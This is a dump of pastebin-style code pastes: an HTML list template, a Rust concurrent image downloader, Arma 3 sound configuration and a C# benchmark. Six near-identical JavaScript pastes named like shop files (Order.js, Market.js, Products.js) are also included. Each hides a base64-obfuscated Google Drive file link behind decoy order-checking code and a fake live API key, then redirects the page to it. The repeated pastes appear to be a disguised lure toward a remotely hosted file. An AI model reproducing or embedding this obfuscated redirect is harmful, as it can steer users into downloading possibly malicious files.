id,title,username,language,date,content
zpdF4EQX,list-subject,Namaru,HTML 5,Sunday 6th of April 2025 08:19:13 AM CDT,"<!DOCTYPE html>
<html xmlns:th=""http://www.thymeleaf.org"">
<head>
    <meta charset=""UTF-8"">
    <title>Lista de Materias</title>
    <link rel=""stylesheet"" href=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"">
</head>
<body class=""container mt-5"">
    <h2>Materias Registradas</h2>

    <a href=""/subjectNew"" class=""btn btn-success mb-3"">Agregar Nueva Materia</a>

    <table class=""table table-bordered"">
        <thead>
            <tr>
                <th>ID</th>
                <th>Nombre</th>
                <th>Código</th>
                <th>Acciones</th>
            </tr>
        </thead>
        <tbody>
            <tr th:each=""materia : ${subject}"">
                <td th:text=""${materia.id}""></td>
                <td th:text=""${materia.materia}""></td>
                <td th:text=""${materia.descripcion}""></td>
                <td>
                    <a th:href=""@{/editSubject/{id}(id=${materia.id})}"" class=""btn btn-warning btn-sm"">Editar</a>
                    <a th:href=""@{/deleteSubject/{id}(id=${materia.id})}"" class=""btn btn-danger btn-sm""
                       onclick=""return confirm('¿Estás seguro de eliminar esta materia?')"">Eliminar</a>
                </td>
            </tr>
        </tbody>
    </table>
</body>
</html>"
h4fjJ8Ru,Order.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 08:14:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/97085/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
p2cJF3tN,Market.js,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 07:58:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/06812/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EvU93nTj,Untitled,Ratqueenkslskskwkw,JavaScript,Sunday 6th of April 2025 07:43:33 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23436/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4c9mCLXS,Products.js,dentira,JavaScript,Sunday 6th of April 2025 07:27:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/39969/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WcDzd0ay,Tokio Rust Concurrency Attempt,MetonymyQT,Rust,Sunday 6th of April 2025 07:26:26 AM CDT,"use std::ops::Deref;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;
use anyhow::{anyhow, Result};
use signal_hook::consts::{SIGINT, SIGTERM};
use tokio::fs::File;
use tokio::io::AsyncWriteExt;
use tokio::sync::mpsc;
use tokio::sync::oneshot;
use tokio::sync::mpsc::Sender;
use tokio::task::JoinHandle;
use signal_hook::iterator::Signals;
use log::{debug, error, info};
use tokio::time::{sleep, timeout};

fn setup_graceful_shutdown(cancelled: Arc<AtomicBool>) {
    thread::spawn(move || {
        let signals = Signals::new([SIGINT, SIGTERM]);
        match signals {
            Ok(mut signal_info) => {
                if signal_info.forever().next().is_some() {
                    info!(""user request cancellation"");
                    cancelled.store(true, Ordering::Relaxed);
                }
            }
            Err(error) => {
                error!(""Failed to setup signal handler: {error}"")
            }
        }
    });
}

async fn download_image(tx: Sender<Result<bytes::Bytes, anyhow::Error>>, url: &str) {
    info!(""Downloading image for {}"", url);
    let resp = reqwest::get(url)
        .await;
    if let Ok(resp) = resp {
        let image_bytes = resp.bytes().await;
        match image_bytes {
            Ok(data) => {
                tx.send(Ok(data)).await.expect(""failed to send message"");
            }
            Err(err) => {
                tx.send(Err(anyhow!(""failed to get image data: {}"", err))).await.expect(""failed to send message"");
            }
        }
    } else {
        tx.send(Err(anyhow!(""failed to get response""))).await.expect(""failed to send message"");
    }
}

#[tokio::main]
async fn main() -> Result<()> {
    env_logger::init();

    let task_timeout = Duration::from_millis(500);

    let (tx, mut rx) = mpsc::channel(32);
    let cancelled = Arc::from(AtomicBool::new(false));
    setup_graceful_shutdown(cancelled.clone());

    let urls: Vec<&str> = vec![
        ""https://images.unsplash.com/photo-1739117956532-8a37c76093dd?fm=jpg"",
        ""https://images.unsplash.com/photo-1735930371721-d1243e8122ab?fm=jpg"",
        ""https://images.unsplash.com/photo-1732204662871-f853329ce638?fm=jpg"",
        ""https://images.unsplash.com/photo-1712677925320-5f93d7f853f5?fm=jpg"",
        ""https://images.unsplash.com/photo-1712677925900-12574cb3cf15?fm=jpg"",
        ""https://images.unsplash.com/photo-1710436000845-bb707af976a6?fm=jpg"",
        ""https://images.unsplash.com/photo-1700386277812-5ff74eb03650?fm=jpg"",
        ""https://images.unsplash.com/photo-1700386277415-c9c5270ee8b8?fm=jpg"",
        ""https://images.unsplash.com/photo-1691947563165-28011f40d786?fm=jpg"",
        ""https://images.unsplash.com/photo-1691782359338-97fcbcce8ce8?fm=jpg""
    ];

    let mut handles: Vec<JoinHandle<()>> = Vec::new();
    for url in urls {
        let tx = tx.clone();
        let handle = tokio::spawn(async move {
            let timeout_status = timeout(task_timeout, download_image(tx, url)).await;
            debug!(""timeout status = {:?} for url {}"", timeout_status, url)
        });
        handles.push(handle);
    }


    let wait_cancelled = cancelled.clone();
    let wait_task = tokio::spawn(async move {
       for handle in handles {
           if wait_cancelled.load(Ordering::Relaxed) {
               handle.abort();
           } else {
               let _ = handle.await;
           }
       }
        drop(tx);
    });

    let mut counter = 1;
    while let Some(message) = rx.recv().await {
        if cancelled.load(Ordering::Relaxed) {
            break
        }

        if let Ok(image_bytes) = message {
            let file = File::create(format!(""{}.jpg"", counter)).await;
            if let Ok(mut file) = file {
                let _ = file.write_all(&image_bytes).await;
                info!(""Wrote image {}"", counter);
            } else {
                error!(""Failed to write image {}"", counter)
            }

            counter += 1;
        }
    }

    let _ = wait_task.await;
    Ok(())
}"
Qrt31gWX,Order.js,dentira,JavaScript,Sunday 6th of April 2025 07:12:22 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66884/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6YjkVe7W,Unit Movement Sounds won't Work On Tanoa Surfaces due missing this sounds,Traggered,C++,Sunday 6th of April 2025 07:09:52 AM CDT,"
	
	{
		""adjust_stand_side"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_stand_side1"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_stand_side"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_stand_side2"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_stand_side"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_stand_side3"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_stand_to_kneel"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_stand_to_kneel1"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_stand_to_kneel"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_stand_to_kneel2"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_kneel_to_stand"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_kneel_to_stand1"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_kneel_to_stand"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_kneel_to_stand2"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_stand_to_prone"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_stand_to_prone"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_prone_to_stand"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_prone_to_stand"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_prone_up"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_prone_up"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_prone_up_back"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_prone_up_back"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_prone_down"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_stand_side1"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_prone_down"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_stand_side2"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_prone_down"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_stand_side3"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_prone_left"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_prone_left"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_prone_right"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_prone_right"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_kneel_to_prone"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_kneel_to_prone"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_prone_to_kneel"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_prone_to_kneel"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_stand_to_left_prone"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_stand_to_left_prone"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_stand_to_right_prone"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_stand_to_right_prone"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_left_prone_to_stand"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_left_prone_to_stand"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""adjust_right_prone_to_stand"",
		
		{
			""\A3\sounds_f\characters\stances\concrete_adjust_right_prone_to_stand"",
			0.25118864,
			1,
			20
		}
	},
	
	{
		""roll"",
		
		{
			""A3\Sounds_F\characters\movements\roll\concrete_roll_1"",
			0.89125091,
			1,
			20
		}
	},
	
	{
		""roll"",
		
		{
			""A3\Sounds_F\characters\movements\roll\concrete_roll_2"",
			0.89125091,
			1,
			20
		}
	},
	
	{
		""roll"",
		
		{
			""A3\Sounds_F\characters\movements\roll\concrete_roll_3"",
			0.89125091,
			1,
			20
		}
	},
	
	{
		""roll_unarmed"",
		
		{
			""A3\Sounds_F\characters\movements\roll\unarmed_concrete_roll_1"",
			0.89125091,
			1,
			20
		}
	},
	
	{
		""roll_unarmed"",
		
		{
			""A3\Sounds_F\characters\movements\roll\unarmed_concrete_roll_2"",
			0.89125091,
			1,
			20
		}
	},
	
	{
		""roll_unarmed"",
		
		{
			""A3\Sounds_F\characters\movements\roll\unarmed_concrete_roll_3"",
			0.89125091,
			1,
			20
		}
	},
	
	{
		""laydown"",
		
		{
			""\A3\Sounds_F\characters\movements\laydown\concrete_laydown_1"",
			0.50118721,
			1,
			20
		}
	},
	
	{
		""laydown"",
		
		{
			""\A3\Sounds_F\characters\movements\laydown\concrete_laydown_2"",
			0.50118721,
			1,
			20
		}
	},
	
	{
		""bodyfall"",
		
		{
			""\A3\sounds_f\characters\movements\bodyfalls\bodyfall_concrete_1"",
			0.50118721,
			1,
			20
		}
	},
	
	{
		""bodyfall"",
		
		{
			""\A3\sounds_f\characters\movements\bodyfalls\bodyfall_concrete_2"",
			0.50118721,
			1,
			20
		}
	},
	
	{
		""bodyfall"",
		
		{
			""\A3\sounds_f\characters\movements\bodyfalls\bodyfall_concrete_3"",
			0.50118721,
			1,
			20
		}
	},
	
	{
		""swim"",
		
		{
			""soundset"",
			""movement_swim_SoundSet""
		}
	},
	
	{
		""Acts_carFixingWheel"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_carFixingWheel"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_PercMwlkSlowWrflDf"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_PercMwlkSlowWrflDf"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_PercMwlkSlowWrflDf2"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_PercMwlkSlowWrflDf2"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_SittingJumpingSaluting_out"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_SittingJumpingSaluting_out"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WalkingChecking"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WalkingChecking"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_CrouchingFiringLeftRifle02"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_CrouchingFiringLeftRifle02"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_CrouchingFiringLeftRifle03"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_CrouchingFiringLeftRifle03"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_CrouchingFiringLeftRifle04"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_CrouchingFiringLeftRifle04"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_HUBABriefing"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_HUBABriefing"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_PointingLeftUnarmed"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_PointingLeftUnarmed"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_SittingJumpingSaluting_in"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_SittingJumpingSaluting_in"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_StandingSpeakingUnarmed"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_StandingSpeakingUnarmed"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_TreatingWounded_in"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_TreatingWounded_in"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_TreatingWounded_out"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_TreatingWounded_out"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_UnconsciousStandUp_part1"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_UnconsciousStandUp_part1"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB01_AIWalk"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_AIWalk"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB01_AIWalk_1"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_AIWalk_1"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB01_AIWalk_1b"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_AIWalk_1b"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB01_AIWalk_2"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_AIWalk_2"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB01_AIWalk_3"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_AIWalk_3"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB01_AIWalk_4"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_AIWalk_4"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB01_AIWalk_5"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_AIWalk_5"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB01_AIWalk_6"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_AIWalk_6"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB01_PlayerWalk_1"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_PlayerWalk_1"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB01_PlayerWalk_2"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_PlayerWalk_2"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB01_PlayerWalk_3"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_PlayerWalk_3"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB01_PlayerWalk_4"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_PlayerWalk_4"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB01_PlayerWalk_5"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_PlayerWalk_5"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB01_PlayerWalk_6"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB01_PlayerWalk_6"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB02_AIWalk"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB02_AIWalk"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB02_AIWalk_2"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB02_AIWalk_2"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB02_AIWalk_3"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB02_AIWalk_3"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB02_AIWalk_4"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB02_AIWalk_4"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB02_AIWalk_5"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB02_AIWalk_5"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB02_AIWalk_6"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB02_AIWalk_6"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB02_PlayerWalk_1"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB02_PlayerWalk_1"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB02_PlayerWalk_2"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB02_PlayerWalk_2"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""Acts_WelcomeOnHUB02_PlayerWalk_3"",
		
		{
			""A3\Sounds_F\characters\cutscenes\concrete_Acts_WelcomeOnHUB02_PlayerWalk_3"",
			0.56234133,
			1,
			20
		}
	},
	
	{
		""AmovPercMstpSnonWnonDnon_exercisePushup"",
		
		{
			""\A3\Sounds_F\characters\cutscenes\concrete_AmovPercMstpSnonWnonDnon_exercisePushup"",
			0.56234133,
			1,
			20
		}
	}"
dtBvwzWh,ParamsBenchmark,mquinlan,C#,Sunday 6th of April 2025 07:08:39 AM CDT,"using BenchmarkDotNet.Attributes;
using BenchmarkDotNet.Running;

namespace ParamsBench;

public class Program
{
    [Benchmark]
    public long ParamsArrayTest() 
        => ParamsArray(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40);
    
    [Benchmark]
    public long ParamsROSpanTest() 
        => ParamsROSpan(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40);
    
    [Benchmark]
    public long ParamsIEnumerableTest() 
        => ParamsIEnumerable(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40);
    
    private static long ParamsArray(params int[] values)
    {
        var result = 0L;
        foreach (var value in values) result += (long)value * 10;
        return result;
    }

    private static long ParamsROSpan(params ReadOnlySpan<int> values)
    {
        var result = 0L;
        foreach (var value in values) result += (long)value * 10;
        return result;
    }

    private static long ParamsIEnumerable(params IEnumerable<int> values)
    {
        var result = 0L;
        foreach (var value in values) result += (long)value * 10;
        return result;
    }

    private static void Main()
    {
        _ = BenchmarkRunner.Run<Program>();    
    }
}"
G9N0PXgx,Market.js,dentira,JavaScript,Sunday 6th of April 2025 06:56:45 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/98689/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
